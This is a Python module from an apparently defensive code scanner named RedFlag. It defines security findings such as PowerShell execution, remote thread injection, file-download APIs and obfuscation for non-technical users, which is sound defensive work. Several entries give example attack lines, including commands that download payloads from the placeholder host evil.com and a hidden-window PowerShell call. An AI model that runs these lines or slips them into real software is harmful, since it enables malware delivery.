"""
Technical definitions for RedFlag findings
Helps non-technical users understand security terms
"""
DEFINITIONS = {
    # Execution
    'Command Prompt Execution': {
        'term': 'Command Prompt Execution',
        'description': 'The code is executing commands through Windows Command Prompt (cmd.exe). This can be used to run system commands, scripts, or other programs.',
        'risk': 'Medium - Can be legitimate (system utilities) or malicious (command injection, backdoors)',
        'example': 'cmd.exe /c "powershell -enc <encoded_command>"'
    },
    'PowerShell Execution': {
        'term': 'PowerShell Execution',
        'description': 'The code is executing PowerShell commands. PowerShell is a powerful scripting language that can be used for legitimate automation or malicious activities like downloading and executing malware.',
        'risk': 'High - PowerShell is commonly abused by malware for obfuscation and evasion',
        'example': 'powershell -WindowStyle Hidden -Command "Download-String"'
    },
    'System Command': {
        'term': 'System Command',
        'description': 'The code is executing system commands using the system() function. This allows running shell commands directly from the program.',
        'risk': 'Medium - Can be used for legitimate system operations or malicious command execution',
        'example': 'system("ping 8.8.8.8")'
    },
    'API Shell Execution': {
        'term': 'API Shell Execution',
        'description': 'The code uses Windows API functions (like ShellExecute) to execute programs or commands. This is more advanced than simple system() calls.',
        'risk': 'Medium-High - Can be used to launch programs, download files, or execute malicious payloads',
        'example': 'ShellExecute(NULL, "open", "malware.exe", NULL, NULL, SW_HIDE)'
    },
    
    # Memory
    'Remote Thread Injection': {
        'term': 'Remote Thread Injection',
        'description': 'The code is injecting code into another running process by creating a thread in that process. This is a common malware technique to hide malicious code inside legitimate processes.',
        'risk': 'High - Classic malware technique for process hollowing and DLL injection',
        'example': 'CreateRemoteThread(target_process, NULL, 0, malicious_code, NULL, 0, NULL)'
    },
    'Reflective DLL Injection Artifact': {
        'term': 'Reflective DLL Injection',
        'description': 'The code contains indicators of reflective DLL injection, a technique where a DLL is loaded directly from memory without using the Windows loader. This bypasses many security controls.',
        'risk': 'Critical - Advanced evasion technique used by sophisticated malware',
        'example': 'DLL loaded from memory buffer without calling LoadLibrary'
    },
    'Memory Manipulation': {
        'term': 'Memory Manipulation',
        'description': 'The code is directly manipulating memory, which can be used for legitimate purposes (optimization) or malicious ones (code injection, process manipulation).',
        'risk': 'Medium - Requires context to determine if malicious',
        'example': 'RtlMoveMemory(dest, source, size)'
    },
    
    # Network
    'Raw Socket': {
        'term': 'Raw Socket',
        'description': 'The code is creating raw network sockets, which allow low-level network communication. Raw sockets can bypass normal network security controls and are often used by malware for stealthy communication.',
        'risk': 'Medium - Legitimate networking libraries use sockets, but raw sockets can be suspicious',
        'example': 'socket(AF_INET, SOCK_RAW, IPPROTO_TCP)'
    },
    'WinINet API': {
        'term': 'WinINet API',
        'description': 'The code uses Windows Internet API functions for network communication. This includes functions like InternetOpen, InternetOpenUrl, and URLDownloadToFile. While legitimate programs use this, malware often uses it to download payloads or exfiltrate data.',
        'risk': 'Low-Medium - Common in legitimate software, but can be used for malicious downloads',
        'example': 'InternetOpenUrl(hInternet, "https://evil.com/payload.exe", NULL, 0, 0, 0)'
    },
    'File Download API': {
        'term': 'File Download API',
        'description': 'The code uses Windows API to download files from the internet (URLDownloadToFile). This is commonly used by malware to download additional payloads or updates.',
        'risk': 'High - Frequently used by malware for downloading malicious files',
        'example': 'URLDownloadToFile(NULL, "https://evil.com/malware.exe", "C:\\temp\\file.exe", 0, NULL)'
    },
    'PowerShell Download': {
        'term': 'PowerShell Download',
        'description': 'The code uses PowerShell commands (like Invoke-WebRequest or iwr) to download files from the internet. This is a very common malware technique.',
        'risk': 'High - Extremely common in malware for downloading and executing payloads',
        'example': 'Invoke-WebRequest -Uri "https://evil.com/payload.exe" -OutFile "$env:TEMP\\malware.exe"'
    },
    
    # Obfuscation
    'Stack String / Shellcode Array': {
        'term': 'Stack String / Shellcode Array',
        'description': 'The code contains byte arrays that look like obfuscated strings or shellcode. These are often used to hide malicious code from static analysis. However, they can also be legitimate embedded resources (fonts, images, etc.).',
        'risk': 'Medium-High - Requires analysis to determine if malicious or just embedded assets',
        'example': 'unsigned char payload[] = {0x4D, 0x5A, 0x90, 0x00, ...}'
    },
    'Hex-Escaped String': {
        'term': 'Hex-Escaped String',
        'description': 'The code contains strings encoded using hexadecimal escape sequences (\\x41\\x42...). This is a common obfuscation technique to hide malicious commands or URLs from simple string searches.',
        'risk': 'High - Almost always used to hide malicious content',
        'example': 'std::string cmd = "\\x70\\x6F\\x77\\x65\\x72\\x73\\x68\\x65\\x6C\\x6C"'
    },
    'Base64 Decoding': {
        'term': 'Base64 Decoding',
        'description': 'The code is decoding Base64-encoded strings. Base64 encoding is often used to obfuscate malicious commands, URLs, or payloads.',
        'risk': 'Medium - Can be legitimate (data encoding) or malicious (obfuscation)',
        'example': 'Convert.FromBase64String("cG93ZXJzaGVsbA==")'
    },
    'PowerShell Encoded Command': {
        'term': 'PowerShell Encoded Command',
        'description': 'The code contains PowerShell commands encoded in Base64 (using -enc flag). This is a very common malware technique to hide malicious PowerShell scripts.',
        'risk': 'High - Almost exclusively used by malware to evade detection',
        'example': 'powershell -enc cABvAHcAZQByAHMAaABlAGwAbAA='
    },
    'XOR Obfuscated Content': {
        'term': 'XOR Obfuscation',
        'description': 'The code contains content obfuscated using XOR encryption. This is a simple but effective way to hide strings, URLs, or payloads from static analysis.',
        'risk': 'High - Commonly used by malware to hide malicious content',
        'example': 'Each byte XORed with a key to hide the original content'
    },
    
    # Crypto
    'Windows Crypto API': {
        'term': 'Windows Crypto API',
        'description': 'The code uses Windows cryptographic functions. This can be legitimate (encrypting user data) or malicious (encrypting files for ransomware, encrypting C2 communication).',
        'risk': 'Low-Medium - Requires context (ransomware vs. legitimate encryption)',
        'example': 'CryptEncrypt(hKey, 0, TRUE, 0, buffer, &len)'
    },
    
    # YARA
    'YARA Match': {
        'term': 'YARA Rule Match',
        'description': 'The code matched a YARA rule pattern. YARA is a pattern-matching tool used to identify malware families, techniques, or suspicious code patterns.',
        'risk': 'Varies - Depends on the specific YARA rule matched',
        'example': 'Matched pattern indicates known malware behavior'
    },
    
    # Metadata
    'Mismatched File Extension': {
        'term': 'Mismatched File Extension',
        'description': 'A file has an extension that doesn\'t match its actual file type (detected by magic bytes). For example, a .txt file that is actually an executable. This is a common malware evasion technique.',
        'risk': 'High - Strong indicator of malicious intent',
        'example': 'file.txt detected as PE executable'
    },
    'Suspicious Binary in Source Directory': {
        'term': 'Suspicious Binary in Source Directory',
        'description': 'An executable or binary file was found in a source code directory. Legitimate projects typically keep binaries in separate build/output directories.',
        'risk': 'Medium - Could be a build artifact or a malicious payload',
        'example': 'malware.exe found in src/ directory'
    }
}

def get_definition(term):
    """Get definition for a finding term"""
    # Try exact match first
    if term in DEFINITIONS:
        return DEFINITIONS[term]
    
    # Try partial match (e.g., "Raw Socket" matches "Raw Socket")
    for key, value in DEFINITIONS.items():
        if term in key or key in term:
            return value
    
    # Try to find by description text
    for key, value in DEFINITIONS.items():
        if term.lower() in value['term'].lower():
            return value
    
    return None

def format_definition(term):
    """Format a definition for display"""
    defn = get_definition(term)
    if not defn:
        return None
    
    return {
        'term': defn['term'],
        'description': defn['description'],
        'risk': defn['risk'],
        'example': defn.get('example', 'N/A')
    }
